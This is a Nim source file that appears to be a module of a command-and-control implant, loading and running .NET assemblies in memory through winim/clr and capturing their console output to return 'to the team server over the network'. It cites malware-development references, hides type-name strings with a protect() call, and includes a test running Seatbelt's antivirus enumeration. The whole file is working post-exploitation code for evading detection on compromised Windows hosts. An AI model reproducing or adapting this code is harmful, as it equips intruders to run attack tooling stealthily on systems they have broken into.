import winim/[lean, clr]
import os, strformat, strutils, sequtils
import ../../common/[types, utils]

#[ 
    Executing .NET assemblies in memory
    References:
    - https://maldevacademy.com/new/modules/60?view=blocks
    - https://github.com/chvancooten/NimPlant/blob/main/client/commands/risky/executeAssembly.nim
    - https://github.com/itaymigdal/Nimbo-C2/blob/main/Nimbo-C2/agent/windows/utils/clr.nim
]#

import sugar

proc dotnetInlineExecuteGetOutput(assemblyBytes: seq[byte], arguments: seq[string] = @[]): string = 
    
    # The winim/clr library takes care of most of the heavy lifting for us here
    # - https://github.com/khchen/winim/blob/master/winim/clr.nim
    var assembly = load(assemblyBytes)

    # Parsing the arguments to be passed to the assembly 
    var args = arguments.toCLRVariant(VT_BSTR)
    
    # Redirect the output of the assembly to a .NET StringWriter so we can return it to the team server over the network
    var 
        mscor = load(protect("mscorlib"))
        io = load(protect("System.IO"))
        Console = mscor.GetType(protect("System.Console"))
        StringWriter = io.GetType(protect("System.IO.StringWriter")) 

    var stringWriter = @StringWriter.new() 
    var oldConsole = @Console.Out
    @Console.SetOut(stringWriter)

    # Execute the assemblies entry point
    assembly.EntryPoint.Invoke(nil, toCLRVariant([args]))

    # Reset console properties
    @Console.SetOut(oldConsole)

    return fromCLRVariant[string](stringWriter.ToString())

proc test*() = 
    
    var bytes = string.toBytes(readFile("C:\\Tools\\precompiled-binaries\\Enumeration\\Seatbelt.exe"))
    var args = @["antivirus"]

    var result = dotnetInlineExecuteGetOutput(bytes, args)
    echo result